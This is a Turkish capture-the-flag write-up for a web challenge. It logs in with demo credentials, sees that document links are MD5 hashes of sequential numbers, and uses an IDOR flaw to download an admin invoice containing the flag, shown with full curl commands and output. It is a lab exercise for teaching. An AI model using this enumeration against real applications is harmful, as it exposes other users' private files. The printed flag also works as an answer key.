# 🎯 MyDocs - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-IDOR-purple?style=for-the-badge" alt="IDOR">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Web  
**Seviye:** Orta  
**Puan:** 500

**Challange URL:** `http://68.183.213.255:9022`

**Challenge Açıklaması:** Agresif araçlara gerek yok.

---

## 🔍 Analiz

**Hedef:** Web uygulamasını analiz ederek flag'i bulmak

**Strateji:** Login → Doküman listesi → Hash analizi → IDOR ile admin belgesine erişim

**İpuçları:**
- 🎯 Belge download linkleri MD5 hash ile yapılmış
- 🔍 Hash'ler sıralı sayıların MD5'i → Sequential pattern
- 💡 IDOR (Insecure Direct Object Reference) zafiyeti mevcut
- 🔑 Demo hesap bilgileri login sayfasında açıkça veriliyor

---

## ✅ Çözüm Adımları

### 🔎 **Adım 1: Hedefi Keşfet**

```bash
curl -s http://68.183.213.255:9022/
```

**Çıktı:**
```
Redirecting... → /login
```

**Analiz:**
- ✅ Uygulama `/login` sayfasına yönlendiriyor
- 💡 Flask/Werkzeug tabanlı Python uygulaması
- 🎯 Login sayfası incelenmeli

---

### 🔐 **Adım 2: Login Sayfasını İncele**

```bash
curl -s http://68.183.213.255:9022/login
```

**Kritik Bulgular:**
```
Demo Accounts:
user / password
alice / alice123
bob / bob456
```

**Analiz:**
- ✅ Demo hesap bilgileri açıkça paylaşılmış
- 💡 Birden fazla kullanıcı var → Her birinin ayrı dokümanları olabilir
- 🎯 Login olup dokümanları inceleyelim

---

### 🔑 **Adım 3: Login Ol ve Session Al**

```bash
curl -s http://68.183.213.255:9022/login -c cookies.txt -X POST \
  -d "username=user&password=password" -v 2>&1
```

**Kritik Çıktı:**
```
< HTTP/1.1 302 FOUND
< Server: Werkzeug/2.3.0 Python/3.9.25
< Location: /
* Added cookie session="eyJ1c2VybmFtZSI6InVzZXIifQ.aa7Ddw.cG97bDrAIfnGWLgngLz6URmEhVQ"
```

**Analiz:**
- ✅ Login başarılı, session cookie alındı
- 💡 Flask session cookie → JWT benzeri imzalı yapı
- 🎯 Cookie ile `/documents` endpoint'ine eriş

---

### 📄 **Adım 4: Doküman Listesini Gör**

```bash
curl -s http://68.183.213.255:9022/documents \
  -H "Cookie: session=eyJ1c2VybmFtZSI6InVzZXIifQ.aa7Ddw.cG97bDrAIfnGWLgngLz6URmEhVQ"
```

**Kritik Çıktı:**
```
Invoice_0002.pdf  →  /download?file=c81e728d9d4c2f636f067f89cc14862c
Invoice_0003.pdf  →  /download?file=eccbc87e4b5ce2fe28308fd9f2a7baf3
Invoice_0004.pdf  →  /download?file=a87ff679a2f3e71d9181a67b7542122c
Invoice_0005.pdf  →  /download?file=e4da3b7fbbce2345d7772b0674a318d5
```

**Analiz:**
- ✅ `user` hesabında Invoice #0002-0005 mevcut
- 💡 Hash'ler tanıdık geldi → MD5 rainbow table kontrolü
- 🎯 Invoice #0001 yok! → Admin belgesi olabilir

---

### 🧠 **Adım 5: Hash Pattern Analizi**

```python
python3 -c "
import hashlib
for i in range(1, 11):
    h = hashlib.md5(str(i).encode()).hexdigest()
    print(f'{i} -> {h}')
"
```

**Çıktı:**
```
1  -> c4ca4238a0b923820dcc509a6f75849b
2  -> c81e728d9d4c2f636f067f89cc14862c  ✅ Invoice_0002
3  -> eccbc87e4b5ce2fe28308fd9f2a7baf3  ✅ Invoice_0003
4  -> a87ff679a2f3e71d9181a67b7542122c  ✅ Invoice_0004
5  -> e4da3b7fbbce2345d7772b0674a318d5  ✅ Invoice_0005
6  -> 1679091c5a880faf6fb5e6087eb1b2dc  (alice)
7  -> 8f14e45fceea167a5a36dedd4bea2543  (alice)
8  -> c9f0f895fb98ab9159f51fd0297e236d  (alice)
9  -> 45c48cce2e2d7fbdea1afc51c7c6ad26  (bob)
10 -> d3d9446802a44259755d38e6d163e820  (bob)
```

**KRİTİK BULGULAR:**
- ✅ Hash'ler = MD5(sıralı sayı) → Sequential pattern!
- 💡 Invoice #0001 = MD5("1") = `c4ca4238a0b923820dcc509a6f75849b`
- 🎯 IDOR zafiyeti ile bu hash'i doğrudan isteyelim

---

### 🚀 **Adım 6: IDOR ile Admin Belgesine Eriş**

```bash
curl -s "http://68.183.213.255:9022/download?file=c4ca4238a0b923820dcc509a6f75849b" \
  -H "Cookie: session=eyJ1c2VybmFtZSI6InVzZXIifQ.aa7Ddw.cG97bDrAIfnGWLgngLz6URmEhVQ" \
  -o invoice1.pdf && file invoice1.pdf
```

**Çıktı:**
```
invoice1.pdf: PDF document, version 1.3, 1 page(s)
```

```bash
pdftotext invoice1.pdf -
```

**Çıktı:**
```
CONFIDENTIAL DOCUMENT
ADMIN INVOICE #0001
FLAG: PITO{1d0r_md5_h4sh_byp4ss_s3qu3nt14l_pwn3d}
This document contains sensitive information.
Access restricted to administrators only.
```

---

## 🚩 **FLAG**
```
PITO{1d0r_md5_h4sh_byp4ss_s3qu3nt14l_pwn3d}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🌐<br><b>curl</b><br><sub>HTTP istekleri</sub></td>
<td align="center">🐍<br><b>Python3</b><br><sub>MD5 hash analizi</sub></td>
<td align="center">📄<br><b>pdftotext</b><br><sub>PDF içerik okuma</sub></td>
</tr>
</table>

---

## 💭 **Çözüm Akış Şeması**

```
🎯 MyDocs Web Challenge
       ↓
🔐 Login sayfası
   → Demo hesaplar açıkça verilmiş
   → user / password ile giriş
   → Flask session cookie alındı
       ↓
📄 /documents endpoint
   → Invoice #0002-0005 listelendi
   → Download URL: /download?file=<hash>
   → Invoice #0001 eksik!
       ↓
🧠 Hash analizi
   → c81e728d = MD5("2") ✅
   → eccbc87e = MD5("3") ✅
   → Sıralı sayıların MD5'i!
   → MD5("1") = c4ca4238a0b923820dcc509a6f75849b
       ↓
🚀 IDOR saldırısı
   → /download?file=c4ca4238a0b923820dcc509a6f75849b
   → Sunucu yetki kontrolü yapmıyor!
   → Admin belgesi indirildi
       ↓
🚩 FLAG: PITO{1d0r_md5_h4sh_byp4ss_s3qu3nt14l_pwn3d}
```
